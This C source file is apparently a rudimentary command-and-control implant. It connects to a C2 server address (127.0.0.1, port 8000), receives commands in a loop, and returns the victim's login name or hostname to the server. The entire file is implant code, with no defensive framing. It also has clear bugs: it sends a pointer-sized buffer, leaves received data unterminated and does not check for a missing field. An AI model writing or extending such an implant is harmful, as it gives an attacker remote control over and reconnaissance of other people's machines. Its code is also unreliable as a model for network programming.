#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define IP "127.0.0.1"
#define PORT 8000

//networked part
void networking();
//executing command
char *executing(char *receive);
//whoami command
char *whoamiCommand();
//hostname command
char *hostnameCommand();

int main() {
    networking();
}

void networking() {
    //socket
    printf("Initializing socket...\n");
    int inferno_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in c2_address;
    memset(&c2_address, 0, sizeof(c2_address));
    c2_address.sin_family = AF_INET;
    c2_address.sin_port = htons(PORT);
    c2_address.sin_addr.s_addr = inet_addr(IP);

    //connect
    printf("Connecting...\n");
    int inferno_connect = connect(inferno_socket, (struct sockaddr *) &c2_address, sizeof(c2_address));
    printf("Connected\n");
    
    while (1) {
    	//receive
    	char receive[1024];
    	printf("Receiving...\n");
    	int inferno_receive = recv(inferno_socket, receive, sizeof(receive), 0);
    	printf("Executing: %s\n", receive);
        
        char *content_length = strstr(receive, "Content-Length:");
        content_length += strlen("Content-Length:");
        char *command = strtok(content_length, " \r\n");
        char *task = executing(command);
        printf("'%s'", command);

    	//send
    	printf("Sending: %s from agent...\n", task);
    	ssize_t inferno_send = send(inferno_socket, task, sizeof(task), 0);
    	printf("Sent\n");
    }
}

char *executing(char *receive) {
    char *task;
    if (strcmp(receive, "1") == 0) {
        printf("Executing %s...\n", receive);
        task = whoamiCommand();
    } else if (strcmp(receive, "hostname") == 0) {
        printf("Executing %s...\n", receive);
        task = hostnameCommand();
    }else {
        task = "hello";
    } return task;
}

char *whoamiCommand() {
    char *username = getlogin();
    return username;
}

char *hostnameCommand() {
    static char hostname[1024];
    gethostname(hostname, 1024);
    return hostname;
}
